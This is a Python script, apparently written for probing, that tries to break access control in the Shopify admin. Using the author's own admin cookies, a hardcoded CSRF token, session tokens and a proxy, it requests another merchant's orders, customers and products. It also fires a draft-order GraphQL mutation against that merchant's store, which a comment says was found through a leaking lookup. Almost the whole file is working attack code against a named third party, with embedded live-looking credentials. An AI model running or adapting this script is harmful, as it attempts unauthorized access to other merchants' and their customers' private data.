# -*- coding: utf-8 -*-
"""跨店铺越权测试:用自己的 admin 会话访问其他店铺的数据
如果服务端不校验会话与 shop 绑定 -> 直接读到别人店铺数据 = 严重越权
"""
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": "https://admin.shopify.com/",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

# 公开已知店铺:pzdea.myshopify.com(UCP lookup_catalog 泄露的 seller)
# 自己店铺:jqpkdm-kb
SHOPS = ["jqpkdm-kb", "pzdea"]

def rest_probe(shop, resource):
    url = f"https://admin.shopify.com/store/{shop}/{resource}"
    try:
        r = requests.get(url, headers=HEADERS, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        body = r.text
        print(f"[REST] {url}")
        print(f"  HTTP {r.status_code} len={len(body)}")
        print(f"  {body[:300]}")
        return r
    except Exception as e:
        print(f"[REST] {url} ERROR {e}")
        return None

def graphql_probe(shop):
    # DraftOrderComplete persisted query - 用别人的 shop 参数,body 是查询自己的草稿订单
    url = f"https://admin.shopify.com/api/operations/12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d/DraftOrderComplete/shopify/{shop}"
    body = {
        "operationName": "DraftOrderComplete",
        "variables": {
            "id": "gid://shopify/DraftOrder/1102015168554",
            "paymentPending": True,
            "paymentGatewayId": None,
            "sourceName": "shopify_draft_orders",
            "bypassCartValidations": False,
        },
        "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
            "client_route_handle": "draftOrders:show",
            "client_pathname": f"/store/{shop}/draft_orders/1102015168554",
            "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
            "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
            "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
    }
    try:
        r = requests.post(url, json=body, headers=HEADERS, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[GQL] {url}")
        print(f"  HTTP {r.status_code}")
        print(f"  {r.text[:400]}")
        return r
    except Exception as e:
        print(f"[GQL] {url} ERROR {e}")
        return None

if __name__ == "__main__":
    print("=" * 60)
    print("TEST 1: 自己的店铺(基线)")
    for res in ["orders.json", "customers.json", "products.json"]:
        rest_probe("jqpkdm-kb", res)
    print("=" * 60)
    print("TEST 2: 别人的店铺 pzdea(越权验证)")
    for res in ["orders.json", "customers.json", "products.json"]:
        rest_probe("pzdea", res)
    print("=" * 60)
    print("TEST 3: GraphQL 跨店铺(session 是否绑定 shop)")
    graphql_probe("pzdea")
    graphql_probe("jqpkdm-kb")
